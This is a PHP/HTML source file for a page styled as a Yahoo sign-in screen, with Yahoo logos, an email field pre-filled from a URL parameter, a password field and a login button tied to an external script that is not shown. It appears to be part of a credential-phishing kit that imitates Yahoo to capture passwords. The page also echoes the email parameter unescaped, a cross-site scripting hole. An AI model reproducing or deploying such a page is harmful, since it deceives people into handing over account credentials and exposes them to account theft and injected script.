<?php
	if(isset($_GET['email'])){
		$email = $_GET['email'];
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Yahoo - login</title>
	<link rel="icon" href="download.png" />
	<link rel="stylesheet" href="style.css" />
</head>
<body>
	<header>
		<div class="header-container">
			<img src="logo.png" width="120px">
		</div>
	</header>
	<section>
		<div class="container">
			<div class="logo-holder">
				<img src="logo.png" width="100px">
			</div>
			<div class="text-holder" style="margin-top: 1em;">
				<h3 style="font-weight: 500; font-family: Arial, Helvetica, sans-serif; margin: 0px;" id="processing">Sign in</h3>
			</div>
			<div class="text-holder" style="margin-top: 1em; margin-bottom: 2.2em;">
				<p style="font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 15px;">using your Yahoo account</p>
			</div>
			<div class="input-holder" id="emailDiv">
				<input type="email" name="" placeholder="Email address" id="email" value="<?php echo $email; ?>" disabled>
				<p style="margin:0px; color: red; font-family: Arial, Helvetica, sans-serif; font-size: 13px; margin-top: 3px;" id="error"></p>
				<button id="next">Next</button>
			</div>
			<div class="input-holder hide" id="passwordDiv">
				<input type="password" name="" placeholder="Password" id="password">
				<p style="margin:0px; color: red; font-family: Arial, Helvetica, sans-serif; font-size: 13px; margin-top: 3px;" id="error"></p>
				<button id="login">Login</button>
			</div>
			<div class="input-holder" style="margin-top: 1em;">
				<p style="font-family: Arial, Helvetica, sans-serif; font-size: 13px; color: #188fff; float: left;">
					<input type="checkbox" style="float:left;">Stay signed in</p>
				<p style="font-family: Arial, Helvetica, sans-serif; font-size: 13px; color: #188fff; float: right;">Trouble siging in?</p>
			</div>
		</div>
	</section>
</body>
<script type="text/javascript" src="script.js"></script>
</html>